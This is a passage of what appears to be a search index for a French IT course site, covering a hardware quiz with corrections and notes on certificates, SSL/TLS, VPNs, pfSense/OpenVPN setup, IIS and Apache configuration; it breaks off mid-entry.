associ\u00e9 \u00e0 un document de travail d'un utilisateur</li> <li> Un r\u00e9pertoire ou dossier permet d'organiser les informations de mani\u00e8re structur\u00e9e et arborescente sur un disque dur</li> <li> La lettre associ\u00e9e \u00e0 un disque dur sur un PC est g\u00e9n\u00e9ralement  X: ou Y:</li> <li> Un syst\u00e8me de fichiers permet de d\u00e9finir une classification syst\u00e9matique des documents dans un r\u00e9pertoire</li> </ul> Correction Correction <ul> <li> Un fichier est la plus petite unit\u00e9 visible par l'utilisateur </li> <li> Il est possible d'utiliser de nombreux niveaux de dossiers </li> <li> La lettre associ\u00e9e \u00e0 un disque dur sur un PC est g\u00e9n\u00e9ralement  X: ou Y:</li> <li> Un syst\u00e8me de fichiers permet de d\u00e9finir une classification syst\u00e9matique des documents dans un r\u00e9pertoire  </li> </ul> A propos de la connectique utilis\u00e9e ou qui \u00e9tait utilis\u00e9e sur un PC, pr\u00e9cisez quelles affirmations parmi les suivantes sont v\u00e9rifi\u00e9es : <ul> <li> Un port s\u00e9rie permet g\u00e9n\u00e9ralement de brancher une carte r\u00e9seau  </li> <li> Un port parall\u00e8le permet le branchement d'une souris</li> <li> Un port USB permet de connecter de nombreux p\u00e9riph\u00e9riques tels que disques externes, imprimantes, cam\u00e9ra ou modem</li> <li> Le p\u00e9riph\u00e9rique utilis\u00e9 couramment pour connecter un ordinateur \u00e0 Internet par le R\u00e9seau de T\u00e9l\u00e9communication Commut\u00e9 (RTC) est un modem/routeur</li> </ul> Correction Correction <ul> <li> Il \u00e9tait surtout utilis\u00e9 pour brancher une souris ou un modem externe  </li> <li> Le port parall\u00e8le \u00e9tait surtout utilis\u00e9 pour brancher des imprimantes, des scanners ou des lecteurs externes. il est de moins en moins utilis\u00e9 au profit du port USB</li> <li> USB signifie Universal Serial Bus et remplace aujourd'hui avantageusement les ports s\u00e9rie et parall\u00e8le</li> <li> Un Modem ou Modulateur-D\u00e9modulateur permet d'effectuer la conversion entre un signal num\u00e9rique, codant des donn\u00e9es num\u00e9riques provenant de l'ordinateur, vers un signal analogique, codant des donn\u00e9es num\u00e9riques sur le Res\u00e9au T\u00e9l\u00e9phonique Commut\u00e9 (RTC). Il assure aussi l'op\u00e9ration inverse.</li> </ul> Associez les valeurs suivantes aux types de p\u00e9riph\u00e9riques concern\u00e9s : <ol> <li>750 gigaoctets</li> <li>4 gigaoctets</li> <li>3 gigahertz</li> <li>20 megabits par seconde</li> <li>8 gigaoctets</li> <li>800 m\u00e9gaoctets</li> <li>1 gigaoctet</li> <li>1 gigabit par seconde</li> <li>16 gigaoctets</li> <li>56 kilobits par seconde</li> </ol> <p>A. ADSL B. M\u00e9moire Vid\u00e9o C. CD-ROM D. DVD-ROM E. M\u00e9moire vive F. Modem RTC G. Cl\u00e9 USB H. Carte r\u00e9seau local I. Processeur J. Disque Dur</p> Correction Correction <ul> <li>4-A : ADSL ou Asymmetric Digital Subscriber Line permet de disposer d'une connexion asym\u00e9trique et peut proposer, par exemple, 20Mbps en t\u00e9l\u00e9chargement depuis Internet (download) et 1Mbps en t\u00e9l\u00e9chargement vers Internet (Upload)</li> <li>7-B : M\u00e9moire vid\u00e9o ou VRAM (V pour vid\u00e9o) Cette m\u00e9moire permet de stocker les informations qui servent \u00e0 afficher une interface graphique pour l'utilisateur (GUI) sur l'\u00e9cran de l'ordinateur. Certaines cartes r\u00e9centes proposent jusqu'\u00e0 4Go de m\u00e9moire d\u00e9di\u00e9e.</li> <li>6-C : CD-ROM Sa capacit\u00e9 de stockage importante et le type de stockage utilis\u00e9 (optique) lui permettent de conserver des donn\u00e9es en toute s\u00e9curit\u00e9.</li> <li>5-D : DVD-ROM</li> <li>2-E : M\u00e9moire Vive ou RAM (Random Access Memory) Ce type de m\u00e9moire est dit volatile puisque toutes les donn\u00e9es sont perdues lorsque l'ordinateur est \u00e9teint.</li> <li>10-F : Modem RTC Sa capacit\u00e9 a quasiment atteint celle du RNIS (R\u00e9seau Num\u00e9rique \u00e0 Int\u00e9gration de Service) qui fonctionne \u00e0 64 Kps pour une connexion (un canal B).</li> <li>9-G : Cl\u00e9 USB (USB Key) Elle permet de stocker et d\u00e9placer ais\u00e9ment des informations.</li> <li>8-H : Carte r\u00e9seau local. Diff\u00e9rent d\u00e9bits seront disponibles sur des r\u00e9seaux locaux : Ethernet (10, 100, 1000 Mbps), par exemple.</li> <li>3-I : Processeur. Il s'agit de la fr\u00e9quence d'horloge du microprocesseur de l'ordinateur. En l'occurrence, ici l'ordinateur est capable de traiter 3 milliards de cycles d'horloge par seconde ! Plusieurs cycles peuvent \u00eatre n\u00e9cessaires pour traiter une instruction.</li> <li>1-J : Disque Dur. Cet espace sert \u00e0 stocker, sous la forme de fichiers organis\u00e9s en dossiers, les informations \u00e0 conserver lors de l'extinction de l'ordinateur.</li> </ul> <p>Enonc\u00e9 1.1</p> <p>a venir</p>"},{"location":"service_web_securite/","title":"Serveur Web","text":""},{"location":"service_web_securite/#qest-ce-quun-serveur-web","title":"Q'est-ce qu'un serveur web ?","text":"<p>Un serveur web est un serveur dans un r\u00e9seau priv\u00e9 (intranet) ou un r\u00e9seau public (internet) H\u00e9bergeant du contenu web (page HTML/CSS) R\u00e9pondant \u00e0 des requ\u00eates HTTP (port 80) ou HTTPS (port 443) au sein d'un navigateur internet. Les serveurs web les plus r\u00e9pandus sont :  </p> <ul> <li>Apache  </li> <li>Ngynx (engineX)  </li> <li>IIS  </li> </ul>"},{"location":"service_web_securite/#fonctionnement-dun-serveur-web","title":"Fonctionnement d'un serveur Web","text":""},{"location":"service_web_securite/#quest-ce-quun-certificat","title":"Qu'est ce qu'un certificat ?","text":"<p>Un certificat est comparable \u00e0 une carte d'identit\u00e9 s\u00e9curis\u00e9e.  </p> <p>Il contient les informations :  </p> <ul> <li>Un num\u00e9ro de s\u00e9rie  </li> <li>L'autorit\u00e9 de certification \u00e9mettrice  </li> <li>La p\u00e9riode de validit\u00e9  </li> <li>Le nom du titulaire de la cl\u00e9 publique  </li> <li>L'algorithme de chiffrement (la cl\u00e9 publique)  </li> <li>L'algorithme de signature (signature num\u00e9rique)  </li> </ul> <p>Il permet d'authentifier une connexion et de garantir que le serveur contact\u00e9 est bien celui qu'il pr\u00e9tend \u00eatre.  </p> <p>Dans le cas d'une connexion HTTPS, l'utilisation d'un certificat SSL est obligatoire. La pr\u00e9sence du cadenas permet de confirmer l'identit\u00e9 du serveur web qui r\u00e9pond \u00e0 la requ\u00eate. On peut donc d\u00e9sormais naviguer en toute confiance, ce site Internet est bien celui qui \u00e9tait cibl\u00e9.  </p> <p></p>"},{"location":"service_web_securite/#comment-lidentite-du-serveur-web-est-elle-validee","title":"Comment l'identit\u00e9 du serveur web est-elle valid\u00e9e ?","text":"<p>Utilisation d'une cha\u00eene de certification  </p> <ul> <li>Un client (navigateur)<ul> <li>Demande l'acc\u00e8s \u00e0 des ressources de fa\u00e7on s\u00e9curis\u00e9e  </li> </ul> </li> <li>Un serveur (site web)<ul> <li>H\u00e9berge des ressources s\u00e9curis\u00e9es  </li> <li>Poss\u00e8de et utilise un certificat pour garantir la communication  </li> </ul> </li> <li>Un valideur (autorit\u00e9 de certification)<ul> <li>A \u00e9mis et garantit le certificat stock\u00e9 par le serveur  </li> <li>D\u00e9chiffre et valide le certificat re\u00e7u par le client  </li> </ul> </li> </ul> <p></p>"},{"location":"service_web_securite/#comment-obtenir-un-certificat","title":"Comment obtenir un certificat ?","text":"<p>Il existe 3 possibilit\u00e9s pour obtenir un certificat :  </p> <ul> <li>G\u00e9n\u00e9rer et utiliser un certificat autosign\u00e9  </li> <li>Utiliser un certificat provenant d'une autorit\u00e9 de certification interne  </li> <li>Obtenir/Acheter un certificat aupr\u00e8s d'une autorit\u00e9 de certification publique  </li> </ul> <p>Parmi ces possibilit\u00e9s, chacune \u00e0 ses avantages et ses inconv\u00e9nients.  </p>"},{"location":"service_web_securite/#les-protocoles-ssltls","title":"Les protocoles SSL/TLS","text":"<p>Protocole SSL (Secure Socket Layer)  </p> <ul> <li>1994: SSL 1.0  </li> <li>1995: SSL 2.0  </li> <li>1996: SSL 3.0  </li> </ul> <p>Pass\u00e9 sous la responsabilit\u00e9 de l'IETF (Internet Engineering Task Force)  </p> <ul> <li>Renomm\u00e9 TLS (Transport Layer Secure)  </li> <li>1999: TLS 1.0 proche de SSL 3.0  </li> <li>2006: TLS 1.1  </li> <li>2008: TLS 1.2  </li> <li>2018: TLS 1.3  </li> </ul> <p>TLS est charg\u00e9 de 3 fonctions  </p> <ul> <li>L'authentification: v\u00e9rification de l'identit\u00e9 du serveur (certificat num\u00e9rique)  </li> <li>La confidentialit\u00e9: chiffrement des donn\u00e9es sur le m\u00e9dia  </li> <li>L'int\u00e9grit\u00e9: garantie de la validit\u00e9 des donn\u00e9es (algorithme de hashage)  </li> </ul>"},{"location":"service_web_securite/#ssl-secure-socket-layer","title":"SSL (Secure Socket Layer)","text":"<p>Protocole SSL :  </p> <ul> <li>Chiffre les donn\u00e9es  </li> <li>Authentifie une connexion lors du transfert de donn\u00e9es sur internet  </li> <li>Protocole d\u00e9pr\u00e9ci\u00e9  </li> <li>ex: s\u00e9curise vos donn\u00e9es bancaire lors d'un achat sur un site web  </li> </ul>"},{"location":"service_web_securite/#tls-transport-layer-security","title":"TLS (Transport Layer Security)","text":"<p>Protocole TLS :  </p> <ul> <li>Version plus r\u00e9cente de SSL  </li> <li>corrige certaines vuln\u00e9rabilit\u00e9s de s\u00e9curit\u00e9 vis-\u00e0-vis des anciens protocole SSL  </li> <li>A prioriser sur du SSL  </li> </ul>"},{"location":"service_web_securite/Gestion_PKI/","title":"Gestion PKI - Private Key Infrastructure","text":""},{"location":"service_web_securite/Gestion_PKI/#certificat-par-autorite-de-certification-publique","title":"Certificat par autorit\u00e9 de certification publique","text":"<p>Les OS et certains navigateurs comme FireFox embarque un certain nombre de certificats racines de confiance. Ils proviennent d'autorit\u00e9s de certification publiques. Tout certificat g\u00e9n\u00e9r\u00e9 par une de ces autorit\u00e9s (ou par des serveurs secondaires) sera automatiquement approuv\u00e9 puisque nous avons confiance dans l'autorit\u00e9 parente. Ces certificats sont souvent payants     - Exception sur des services comme \"Let's Encrypt\" Ils permettent de publier des services sur Internet avec impl\u00e9mentation du SSL.  </p> <p>Microsoft met \u00e0 disposition sur ses OS serveur le r\u00f4le AD CS aussi appel\u00e9 PKI (Private Key Infrastructure). Ce r\u00f4le permet de g\u00e9n\u00e9rer des certificats qu'on pourra utiliser pour tous les services internes (web, Exchange...) Les machines clientes pourront faire confiance aux certificats g\u00e9n\u00e9r\u00e9s sans action particuli\u00e8re, car le certificat racine sera automatiquement deploy\u00e9 sur toutes les machines de l'AD. Une fois la PKI en place, on pourra ajouter des services facilement. Il sera cependant toujours tr\u00e8s compliqu\u00e9 de publier les services sur internet.  </p>"},{"location":"service_web_securite/VPN/","title":"VPN","text":"<p>...</p> <p>Un VPN (Virtual PRivate Network) est un tunnel chiffr\u00e9 qui permet de garantir la confidentialit\u00e9 des donn\u00e9es qui y transitent La plupart du temps mis en oeuvre sur le pare-feu et utilis\u00e9 dans deux cas de figure :  </p> <ul> <li>VPN site \u00e0 site (entre deux sites d'une soci\u00e9t\u00e9)  </li> <li>VPN nomade (entre un utilisateur distant et l'entreprise)  </li> </ul>"},{"location":"service_web_securite/VPN/#vpn-nomade","title":"VPN Nomade","text":"<p>Le VPN nomade est utilis\u00e9 pour permettre \u00e0 un utilisateur itin\u00e9rant de se connecter aux services de l'entreprise en toute s\u00e9curit\u00e9. Dans le cadre de connexion sur des Hotspot (Wifi public), c'est la bonne pratique pour \u00e9viter que les communications soient intercept\u00e9es par un tiers. Une fois la connexion VPN \u00e9tablie, l'ordinateur se retrouve directement connect\u00e9 au r\u00e9seau interne de l'entreprise. L'utilisateur a acc\u00e8s aux ressources.  </p> <p></p> <p>A ce jour, on retrouve majoritairement 3 technologies :  </p> <ul> <li>VPN PPTP  </li> <li>VPN SSL  </li> <li>VPN L2TP/IPSec  </li> </ul>"},{"location":"service_web_securite/VPN/#vpn-pptp-point-to-point-tunneling-protocol","title":"VPN PPTP (Point to Point Tunneling Protocol)","text":"<p>Le VPN PPTP : </p> <ul> <li>Protocole d\u00e9velopp\u00e9 par Microsoft  </li> <li>Utilise le port TCP 1723  </li> <li>Authentification uniquement par un mot de passe  </li> <li>Facile \u00e0 configurer  </li> <li>Multiplateformes (Windows, macOS, Linux, OS mobiles)  </li> <li>Fonctionne sur la couche 2 du mod\u00e8le OSI  </li> <li>Protocole non chiffr\u00e9 donc une s\u00e9curit\u00e9 assez faible (s\u00fbrement d\u00e9j\u00e0 craqu\u00e9 par la NSA)  </li> </ul> <p>Le VPN SSL : </p> <ul> <li>Utilise le port 443  </li> <li>Ouvert par d\u00e9faut sur tous les r\u00e9seaux publics  </li> <li>Aucun logiciel suppl\u00e9mentaire \u00e0 installer (le client est en g\u00e9n\u00e9ral le navigateur )  </li> <li>Facile \u00e0 configurer  </li> <li>Multiples m\u00e9thodes d'authentification  </li> <li>Utilise la couche session du mod\u00e8le OSI  </li> </ul> <p>Le VPN L2TP/IPsec : (Layer 2 Tunneling Protocol / Internet Protocol Security)  </p> <ul> <li>Protocole d\u00e9velopp\u00e9 par Cisco  </li> <li>Utilise des ports sp\u00e9cifiques qui peuvent \u00eatre bloqu\u00e9s par les r\u00e9seaux publics  <ul> <li>UDP 1701 pour le service  </li> <li>UDP 500 pour l\u00e9change de cl\u00e9  </li> <li>50 pour le chiffrement par IPSec  </li> </ul> </li> <li>L2TP utilise la couche liaison et IPSec la couche r\u00e9seau de mod\u00e8le OSI</li> </ul>"},{"location":"service_web_securite/VPN/#vpn-site-a-site","title":"VPN Site \u00e0 Site","text":"<p>Utilis\u00e9 pour relier deux sites distants g\u00e9ographiquement Utilise g\u00e9n\u00e9ralement le protocole IPSec \u00e9tabli en couche 3 du mod\u00e8le OSI 4 aspects sont mis en avant sur IPSec :  </p> <ul> <li>Confidentialit\u00e9 (chiffrement)  </li> <li>Authentification  </li> <li>Int\u00e9grit\u00e9  </li> <li>Anti-rejet</li> </ul> <p>Un tunnel IPSec est \u00e9tabli en 2 phases qui seront \u00e0 configurer Phase 1 :  </p> <ul> <li>Correspond \u00e0 l'\u00e9tablissement d'un canal permettant l'authentification des partenaires au travers d'un \u00e9change de cl\u00e9s  </li> <li>Aucune donn\u00e9e ne peut encore transiter  </li> <li>Le mode \"Main\" est utilis\u00e9 pour le site \u00e0 site (entre deux adresses IP publiques)  </li> </ul> <p>Phase 2 :  </p> <ul> <li>Etablissement du tunnel chiffr\u00e9 qui sera utilis\u00e9 pour le transport des donn\u00e9es  </li> </ul> <p></p> <p>Echange bidirectionnel de cl\u00e9s pr\u00e9partag\u00e9es pour authentifier les partenaires Echange bidirectionnel des cl\u00e9s dans le canal Etablissement du VPN chiffr\u00e9  </p>"},{"location":"service_web_securite/VPN/#parametrage-pfsense","title":"Param\u00e9trage pfSense","text":"<p>Ajout d'une AC sur pfSense </p> <ul> <li>Permet de s\u00e9curiser la communication dans le VPN  </li> <li>Utilisation de certificats  </li> </ul> <p>Ajout d'une authentification LDAP </p> <ul> <li>Ajout d'une connexion entre pfSense et Active Directory  </li> <li>Permet une double authentification  </li> </ul>"},{"location":"service_web_securite/VPN/#ajout-de-lauthentification-ldap","title":"Ajout de l'authentification LDAP","text":"<ul> <li>Systeme  <ul> <li>Gestionnaire d'usagers  <ul> <li>Serveurs d'authentification  </li> <li>Ajouter  </li> </ul> </li> </ul> </li> <li> <p>Param\u00e8tres du serveur  </p> <ul> <li>Nom descriptif  <ul> <li>Nommer le serveur d'authentification  <ul> <li>Nom du domaine AD  </li> </ul> </li> </ul> </li> <li>Type  <ul> <li>LDAP  </li> </ul> </li> </ul> </li> <li> <p>Param\u00e8tres serveur LDAP  </p> <ul> <li>Nom d'h\u00f4te ou adresse IP  <ul> <li>Indiquer le FQDN ou @IP du Contr\u00f4leur de domaine  </li> </ul> </li> <li>Valeur du port  <ul> <li>389 (port LDAP)  </li> </ul> </li> <li>Transport  <ul> <li>Transport TCP (par d\u00e9faut)  </li> </ul> </li> <li>Autorit\u00e9 de certification du pair  <ul> <li>Choisir l'AC cr\u00e9\u00e9e pr\u00e9c\u00e9demment  </li> </ul> </li> <li>Version du protocole  <ul> <li>3 (par d\u00e9faut)  </li> </ul> </li> <li>D\u00e9lai de connexion au serveur  <ul> <li>25 (par d\u00e9faut)  </li> </ul> </li> <li>Champ de recherche  <ul> <li>Level  <ul> <li>Sous-arbre entier (toute l'arborescence LDAP)  </li> <li>Niveau unique (une OU)  </li> </ul> </li> <li>Base DN  <ul> <li>Nom du domaine au format LDAP  </li> <li>dc=domaine,dc=tld  </li> </ul> </li> </ul> </li> <li>Conteneurs d'authentification  <ul> <li>OU(s) ou conteneur contenant les comptes utilisateurs utilisant le VPN  </li> </ul> </li> <li>Requ\u00eates \u00e9tendues  <ul> <li>Ne pas cocher \"Activer les requ\u00eates \u00e9tendues\"  </li> </ul> </li> <li>Lier anonyme  <ul> <li>D\u00e9cocher pour indiquer le compte de liaison avec AD  </li> </ul> </li> <li>Lier les informations d'identification  <ul> <li>Renseigner le DN et son MDP du compte AD  </li> </ul> </li> <li>Mod\u00e8le initial  <ul> <li>Microsoft AD  </li> </ul> </li> <li>Attribut de nommage utilisateur  <ul> <li>SamAccountName (en fonction du mod\u00e8le)  </li> </ul> </li> <li>Attribut de nommage de groupe  <ul> <li>cn (en fonction du mod\u00e8le)  </li> </ul> </li> <li>Attribut de membre du groupe  <ul> <li>memberOf (en fonctione du mod\u00e8le)  </li> </ul> </li> <li>Les autres param\u00e8tres <ul> <li>Param\u00e8tres par d\u00e9faut  </li> </ul> </li> </ul> </li> </ul>"},{"location":"service_web_securite/VPN/#verification","title":"V\u00e9rification","text":"<p>Serveur d'authentification cr\u00e9\u00e9  </p> <p>Test de la configuration  </p> <ul> <li>Diagnostics/Authentification  </li> </ul> <p>Test d'authentification  </p> <ul> <li>Serveur d'authentification  <ul> <li>Choix du serveur  </li> </ul> </li> <li>Nom d'utilisateur  </li> <li>Mot de passe  </li> </ul> <p>R\u00e9ussite du test  </p>"},{"location":"service_web_securite/VPN/#parametrage-dns-pfsense","title":"Param\u00e9trage DNS pfSense","text":"<p>R\u00e9solution DNS  </p> <ul> <li>Lier pfSense avec le DNS  </li> <li>Syst\u00e8me/Configuration g\u00e9n\u00e9rale  </li> </ul> <p>Syst\u00e8me  </p> <ul> <li>Domaine  <ul> <li>Rajouter le suffixe DNS  </li> </ul> </li> </ul> <p>Param\u00e8tre du serveur DNS  </p> <ul> <li>Serveur DNS  <ul> <li>Ajouter l'adresse IP du serveur DNS  </li> </ul> </li> <li>Remplacer le serveur DNS  <ul> <li>D\u00e9cocher la case  </li> </ul> </li> <li>DNS Resolution Behavior  <ul> <li>Use remote DNS Servers, ignore local DNS  </li> </ul> </li> </ul>"},{"location":"service_web_securite/VPN/#parametrage-openvpn","title":"Param\u00e9trage OpenVPN","text":"<ul> <li> <p>VPN  </p> <ul> <li>OpenVPN  <ul> <li>Assitants  </li> </ul> </li> </ul> </li> <li> <p>Assistant  </p> <ul> <li>OpenVPN Remote Acces Server Setup  <ul> <li>Select an Authentification Backend Type  <ul> <li>Choisir le type d'authentification  <ul> <li>Local User Access  </li> <li>LDAP  </li> <li>RADIUS  </li> </ul> </li> </ul> </li> <li>LDAP Server Selection  <ul> <li>LDAP Authentification Server List  <ul> <li>Choisir le serveur LDAP  </li> </ul> </li> </ul> </li> <li>Certificate Authority Selection  <ul> <li>Choose a Certificate Authority (CA)  <ul> <li>CA-OpenVPN  </li> </ul> </li> </ul> </li> <li>Server Certificate Selection  <ul> <li>Choose a Server Certificate  <ul> <li>OpenVPN-Cert-Srv  </li> </ul> </li> </ul> </li> <li>Server Setup  <ul> <li>General OpenVPN Server Information  <ul> <li>Interface (Interface \u00e9coutant pour les connexions VPN)  </li> <li>Protocole (Protocole utilis\u00e9 pour les connexions VPN)  </li> <li>Local Port (Port d'\u00e9coute pour les connexions VPN)  </li> <li>Description (Information pour diff\u00e9rencier les serveurs VPN)  </li> </ul> </li> <li>Param\u00e8tres cryptographiques  <ul> <li>Laisser les param\u00e8tres par d\u00e9faut  </li> </ul> </li> <li>Param\u00e8tres du tunnel  <ul> <li>R\u00e9seau Tunnel  <ul> <li>Indiquez l'adresse du r\u00e9seau du VPN  </li> </ul> </li> <li>Passerelle de redirection  <ul> <li>Cochez si tout trafic du client doit passer par le VPN  </li> </ul> </li> <li>Local Network<ul> <li>Liste des r\u00e9seaux accessibles \u00e0 travers le VPN  </li> </ul> </li> <li>Concurrent Connections  <ul> <li>Nbre de connexions VPN simultan\u00e9 (Nbre de clients)  </li> </ul> </li> </ul> </li> <li>Param\u00e8tres du client  <ul> <li>IP dynamique  <ul> <li>Cocher, les clients gardent la connexion m\u00eame s'ils changent d'@IP  </li> </ul> </li> <li>Topologie  <ul> <li>Sous-r\u00e9seau : une @IP par client (m\u00eame sous-r\u00e9seau)  </li> <li>Net30 : un r\u00e9seau par client (sous-r\u00e9seaux diff\u00e9rents)  </li> </ul> </li> <li>Domaine DNS par d\u00e9faut  <ul> <li>Renseigner le(s) serveur(s) DNS  </li> </ul> </li> <li>Idem par les serveurs de temps et les serveurs WINS  </li> </ul> </li> <li>Traffic from clients to server<ul> <li>Cr\u00e9ation de la r\u00e8gle de connexions au serveur VPN  </li> </ul> </li> <li>Traffic from clients through VPN  <ul> <li>Cr\u00e9ation de la r\u00e8gle de communication \u00e0 travers du VPN  </li> </ul> </li> </ul> </li> </ul> </li> </ul> </li> </ul>"},{"location":"service_web_securite/serveur_IIS/","title":"Serveur Web IIS","text":"<p>IIS : acronyme pour Internet Information Services  </p> <p>Les versions d'IIS </p> <p></p>"},{"location":"service_web_securite/serveur_IIS/#installation-du-service-iis","title":"Installation du service IIS","text":"<p>A partir du gestionnaire de serveur  </p> <p></p> <p></p>"},{"location":"service_web_securite/serveur_IIS/#verification-de-linstallation-de-iis","title":"V\u00e9rification de l'installation de IIS","text":"<p>Afin de v\u00e9rifier l'installation du serveur IIS :  </p> <p>Depuis un OS Windows dans un navigateur :  </p> <ul> <li>http://@IP_du_serveur  </li> <li>http://127.0.0.1  </li> <li>http://localhost  </li> </ul> <p></p>"},{"location":"service_web_securite/serveur_IIS/#repertoire-dinstallation-de-iis","title":"R\u00e9pertoire d'installation de IIS","text":"<p>R\u00e9pertoire de travail : c:\\inetpub   - R\u00e9pertoire contenant le site web par d\u00e9faut : c:\\inetpub\\wwwroot</p> <p>Administration de IIS s'effectue via :  </p> <ul> <li> <p>La console Gestionnaire des services Internet (IIS)  </p> </li> <li> <p>En PowerShell  </p> </li> </ul>"},{"location":"service_web_securite/serveur_IIS/#console-gestionnaire-des-services-internet","title":"Console Gestionnaire des services Internet","text":"<p>Param\u00e9trage du serveur  </p> <p></p> <ul> <li>Document par d\u00e9faut  <ul> <li>Liste des fichiers de d\u00e9marrage des sites  </li> </ul> </li> <li>Authentification  <ul> <li>Gestion des diff\u00e9rentes authentifications  </li> </ul> </li> <li>Certificats de serveur  <ul> <li>Gestion des diff\u00e9rents certificats  </li> </ul> </li> <li>Exploration de r\u00e9pertoire  <ul> <li>Gestion de l'affichage du contenu du r\u00e9pertoire  </li> </ul> </li> </ul> <p></p> <ul> <li>Sites  <ul> <li>Liste des sites h\u00e9berg\u00e9s par le serveur  </li> <li>Le site web par d\u00e9faut  <ul> <li>Default web site  </li> </ul> </li> </ul> </li> <li>Documents par d\u00e9faut  <ul> <li>Liste des fichiers de d\u00e9marrage des sites  </li> </ul> </li> </ul>"},{"location":"service_web_securite/serveur_IIS/#stockage-des-sites","title":"Stockage des sites","text":"<p>Stocker les sites sur un autre disque ou un autre serveur  </p> <ul> <li>Cr\u00e9er un r\u00e9pertoire de stockage global  </li> <li>Cr\u00e9er un r\u00e9pertoire individuel par site  </li> <li>Ex: intranet.mydocs.lcl  <ul> <li>Cr\u00e9er le r\u00e9pertoire d:\\sites_web  </li> <li>Cr\u00e9er le r\u00e9pertoire d:\\sites_web\\intranet.mydocs.lcl  </li> <li>Copier les fichiers du site dans le r\u00e9pertoire  <ul> <li>ex: fichier de d\u00e9marrage \"index.html\"  </li> </ul> </li> </ul> </li> </ul>"},{"location":"service_web_securite/serveur_IIS/#declaration-du-site-web","title":"D\u00e9claration du site web","text":"<p>Dans le gestionnaire des services Internet  </p> <ol> <li>Ajoutez un site web  </li> </ol> <p></p> <ol> <li>D\u00e9finissez le site  </li> </ol> <p></p>"},{"location":"service_web_securite/serveur_IIS/#gestion-des-acces","title":"Gestion des acc\u00e8s","text":"<p>R\u00e8gles d'autorisation  </p> <ul> <li>G\u00e9rer les personnes pouvant au site ou au serveur  <ul> <li>Autoriser  </li> <li>Bloquer  </li> </ul> </li> </ul> <p>Restrictions par adresse IP et domaine  </p> <ul> <li>G\u00e9rer les @IP pouvant acc\u00e9der au site ou au serveur  <ul> <li>Autoriser une @IP ou une tranche d'@IP  </li> <li>Bloquer une @IP ou une tranche d'@IP  </li> </ul> </li> </ul>"},{"location":"service_web_securite/serveur_IIS/#certificat-autosigne-sous-iis","title":"Certificat autosign\u00e9 sous IIS","text":"<p>Cr\u00e9ation d'un certificat autosign\u00e9 sous IIS  </p> <ul> <li>Cr\u00e9ation \u00e0 partir de la configuration globale  </li> <li>Certificats de serveur  </li> </ul> <p></p> <p>Puis suite \u00e0 cela cliquer sur \"Cr\u00e9er un certificat auto-sign\u00e9...\"  </p> <p></p> <p>Il faudra ensuite indiquer le nom du site (www.mydocs.lcl) ainsi que le magasin de certificat (H\u00e9bergement Web dans notre cas)  </p> <p></p> <p>Suite \u00e0 cela le certificat est cr\u00e9e.  </p> <p></p>"},{"location":"service_web_securite/serveur_apache/","title":"Serveur Apache","text":""},{"location":"service_web_securite/serveur_apache/#historique-apache","title":"Historique Apache","text":"<p>Issus du serveur HTTPD Regroupant des correctifs d\u00e9velopp\u00e9s par diff\u00e9rents Webmasters se sont r\u00e9unis et on form\u00e9 le \"Apache Foundations\" Le nom \"Apache Server\" proviendrait de \"A Patchy Server\" La premi\u00e8re version \"Apache Server 0.62\" date d'avril 1995 Serveur web le plus ppopulaire  </p>"},{"location":"service_web_securite/serveur_apache/#installation-apache","title":"Installation Apache","text":"<p>l'installation d'Apache2 s'effectue via la commande :  </p> <pre><code>apt install apache2\n</code></pre>"},{"location":"service_web_securite/serveur_apache/#verification-installation","title":"V\u00e9rification installation","text":"<p>Machine avec interface graphique : </p> <p></p> <p>Afin de verifier l'installation du serveur il suffit d'ouvrir un navigateur et de taper :</p> Depuis un poste clientDepuis le serveur <p>http://[@l'ip_du_srv_web]</p> <p>http://[localhost]</p> <p>Machine sans interface graphique : </p> <p></p> <p>afin de verifier si l'arborescence apache est bien pr\u00e9sente en ouvrant le r\u00e9pertoire <code>/etc/apache2</code>. Celui-ci contient plusieurs fichiers :  </p> Configuration principaleConfiguration compl\u00e9mentaireVariables d'environnementFichier contenant les ports d'\u00e9couteModules Compl\u00e9mentaireSites h\u00e9berg\u00e9s <p>apache2.conf : Celui-ci contient le fichier principal de configuration Il charge les autres fichiers gr\u00e2ce aux directives \"Include\"  </p> <p>conf-available : Contient les fichiers de configuration compl\u00e9mentaires &lt;conf-enabled : Liens symboliques des fichiers de configuration charg\u00e9s au d\u00e9marrage pointant vers le r\u00e9pertoire \"conf.available\"  </p> <p>envvars : Contient les variables d'environnement pour l'ex\u00e9cution des commandes <code>apache2ctl</code> </p> <p>ports.conf : Fichier contenant les ports d'\u00e9coute d'Apache - 80 : Port HTTP (par d\u00e9faut) - 443 : Port HTTPs  </p> <p>Mods-available :&gt; Contient les fichiers de configuration des modules d'Apache Mods-enabled : Liens symboliques des fichiers de modules charg\u00e9s au d\u00e9marrage pointant vers le r\u00e9pertoire \"mods-available\"  </p> <p>Sites-available : Contient les fichiers de configuration des sites web h\u00e9berg\u00e9s Sites-enabled : Liens symboliques des fichiers de configuration publi\u00e9s pointant vers le r\u00e9pertoire \"sites-availables\"  </p>"},{"location":"service_web_securite/serveur_apache/#instruction-listen","title":"Instruction \"listen\"","text":"<p>Celle-ci se trouve dans le fichier ports.conf Pr\u00e9sente plusieurs fois (80 &amp; 443) D\u00e9finit les ports et les adresses sur lesquels le serveur \u00e9coute Structure de l'instruction :  </p> <ul> <li>Listen [adresse IP:]port[protocole] </li> </ul> <p>Exemple : </p> <ul> <li>Listen 80 \u00e9coute sur toutes les interfaces sur le port 80  </li> <li>Listen 443 \u00e9coute sur toutes les interfaces sur le port 443  </li> <li>Listen 80.10.12.13:80 \u00e9coute sur l'interface 80.10.12.13 sur le port 80  </li> <li>Listen 80.10.20.30:443 \u00e9coute sur l'interface 80.10.20.30 sur le port 443  </li> </ul>"},{"location":"service_web_securite/serveur_apache/#instruction-directoryindex","title":"Instruction \"DirectoryIndex\"","text":"<p>Pr\u00e9sente dans le fichier <code>/etc/apache2/mods-enabled/dir.conf</code> Liste le nom du fichier \u00e0 envoyer au navigateur lors de l'acc\u00e8s \u00e0 un site Fichier \"dir.conf\"  </p> <pre><code>&lt;IfModule mod_dir.c&gt;\n    DirectoryIndex index.html index.cgi index.pl index.php index.xhtml index.htm\n&lt;/IfModule&gt;\n# vim: syntax=apache ts=4 sw=4 sts=4 sr noet\n</code></pre>"},{"location":"service_web_securite/serveur_apache/#gestion-du-service-apache2","title":"Gestion du service Apache2","text":""},{"location":"service_web_securite/serveur_apache/#commande-systemctl","title":"Commande <code>systemctl</code>","text":"<p><code>systemctl {start | stop | restart | reload | enable | disable | status} apache2</code> </p> <p></p>"},{"location":"service_web_securite/serveur_apache/#commande-apache2ctl","title":"Commande <code>apache2ctl</code>","text":"<pre><code>apache2ctl start         # 